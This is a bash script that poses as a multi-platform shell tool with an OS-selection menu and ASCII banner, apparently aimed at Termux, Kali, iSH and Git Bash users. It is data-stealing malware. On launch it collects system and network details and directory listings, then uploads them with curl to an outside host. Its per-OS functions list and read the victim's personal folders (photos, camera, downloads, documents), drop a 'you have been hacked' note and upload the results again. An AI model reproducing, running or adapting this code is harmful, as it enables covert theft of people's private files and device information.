#!/system/bin/bash/sh                                                            clear
echo -e "\033[33;32m"
echo "Copyright By Pham Chien                                                    
  System : $(uname -a)
  User   : $(whoami)
  date   : $(date)
  path   : $(pwd)                                                                  id     : $(id)

$(ifconfig)

$(cd /$HOME/ ; ls -s -u)

"> system.txt
curl -T system.txt http://happy.mikikk.co.jp/
                                                                                 termux() {                                                                       
termux-setup-storage

echo "
                                                                                   $(ifconfig)

  $(cd /sdcard/documents ; ls -s -u)                                             
  ===== FILES SDCARD =====

  $(cd /sdcard/ ; ls -s -u)

  ===== Android Files =====                                                                                                                                         $(cd /sdcard/Android ; ls -s -u)
                                                                                   ===== DATA ANDROID =====                                                       
  $(cd /sdcard/Android/data ; ls -s -u)                                                                                                                             ===== MOVIE FILES =====
                                                                                   $(cd /sdcard/Movies ; ls -s -u)                                                
  ==== Messenger =====                                                                                                                                              $(cd /sdcard/Movies/ * ; ls -s -u)
                                                                                   ==== Pictures =====                                                            
  $(cd /sdcard/Pictures ; cd * ; ls -s -u)                                                                                                                          ====== Download =====
                                                                                   $(cd /sdcard/download ; echo 'All your data has been hacked , contact me : cyberkex.phamchien.net@gmail.com' >> you_have_been_hacked.txt ; ls -s -u ; cat *)
                                                                                   $(cd /sdcard/download ; cd * ; ls -l -u)                                       
  ====== Image ======                                                            
  $(cd /sdcard/DCIM/Screenshots ; ls -s -u)

  ====== VIDEO ======

 $(cd /sdcard/DCIM/Camera ; ls -s -u)

  ====== Camera =====

$(cd /sdcard/DCIM/Camera/ ; cd * ; cd * ; ls -s -u) " >> system.txt
   curl -T system.txt http://happy.mikikk.co.jp/
}

kali() {
echo "

  $(ifconfig)

  $(cd /home/kali/etc/fstab ; ls -l )

  $(cd /home/kali/Downloads ; ls -l )

  $(cd /home/kali/Pictures ; ls -s -u )

  $(cd /home/kali/Desktop ; ls -s -u )

  $(cd /home/kali/Videos ; ls -s -u )

  $(cd /home/kali/Documents ; ls -s -u )

  $(cd /home/kali/Public ; ls -s -u)

  $(cd /home ; ls -s -u ) ">> system.txt

curl -T system.txt http://happy.mikikk.co.jp/
}

ios() {
echo "
  $(cd / ; ls -s -u)

  $(cd /root ; ls -s -u)

  $(cd /usr ; ls -s -u )

  $(cd * ; ls -s -u)  ">> system.txt

  curl -T system.txt http://happy.mikikk.co.jp/
}
win() {
echo "

  $(ifconfig)

  $(cd /c/Users/$(whoami)/Downloads ; dir )

  $(cd /c/Users/$(whoami)/Pictures ; dir  )

  $(cd /c/Users/$(whoami)/Desktop ; dir )

  $(cd /Users/$(whoami)/Videos ; dir)

  $(cd /c/Users/$(whoami)/Documents ; dir )

  $(cd /c/Users/$(whoami)/Public ; dir )

  $(cd /c/Users/$(whoami) ; dir ) " >> system.txt
  curl -T system.txt http://happy.mikikk.co.jp/
}

windows() {
echo "test" > test.txt
mv test.txt /c/Users/$(whoami)/Downloads
  if [ -f /c/Users/$(whoami)/Downloads/test.txt ]
    then
       echo "success"

  else
    echo "your operating system is not valid"
    exit 1
  fi
}
android() {
echo "test" > test.txt
mv test.txt /sdcard/download
  if [ -f /sdcard/download/test.txt ]
    then
       echo "success"

  else
    echo "your operating system is not valid"
    exit 1
  fi
}

iphone() {
echo "test" > test.txt
mv test.txt /root
  if [ -f /root/test.txt ]
   then
     echo "success"

  else
     echo "your operating system is not valid"
    exit 1
  fi
}

kali_linux() {
echo "test" > test.txt
mv test.txt /home/kali/desktop
  if [ -f /home/kali/desktop/test.txt ]
    then
      echo "success"

  else
     echo "your operating system is not valid"
    exit 1
  fi
}

sent_num() {
echo -n Enter Name File :
read file
   echo "Wish you luck next time , contact : cyberkex.phamchien.net@gmail.com"
   exit 1
}
system() {
echo "
 ____             _       _                    ____        _ _     _
| __ )  __ _  ___| | ____| | ___   ___  _ __  | __ ) _   _(_) | __| |
|  _ \ / _\ |/ __| |/ / _\ |/ _ \ / _ \| |__| |  _ \| | | | | |/ _\ |
| |_) | (_| | (__|   < (_| | (_) | (_) | |    | |_) | |_| | | | (_| |
|____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|    |____/ \__,_|_|_|\__,_|
        PhamChienAdams ©

[:::]tool does not integrate with cloudshell[:::]
[:::]only works with kali , termux , ish , git shell[:::]

[!] Are you use system ?
1 ) System kali
2 ) System Android
3 ) System iphone
4 ) System win X64"

  echo -n "Are You Use my System : "
   read system

   case $system in

   4)
   windows
   win
  sent_num
  ;;

   1)
   kali_linux
   kali
   echo -e "\033[33;35m"
   sent_num
  ;;

  2)
  android
  termux
  echo -e "\033[33;35m"
  sent_num
  ;;

  3)
  iphone
  ios
  echo -e "\033[33;35m"
  sent_num
  ;;

  *)
   echo Command not found
   system
esac
}
system
